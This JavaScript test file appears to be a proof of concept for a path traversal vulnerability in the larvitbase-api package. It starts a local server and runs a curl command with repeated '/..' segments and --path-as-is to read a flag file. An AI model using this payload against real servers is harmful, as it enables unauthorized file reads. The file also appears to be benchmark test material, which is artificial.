const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in larvitbase-api", (done) => {
  const Api = require("larvitbase-api");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  let api;

  api = new Api({
    baseOptions: { httpOptions: 8001 }, // sent to larvitbase
    routerOptions: {}, // sent to larvitrouter
    reqParserOptions: {}, // sent to larvitReqParser
  });

  api.start(function (err) {}); // callback

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8001${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
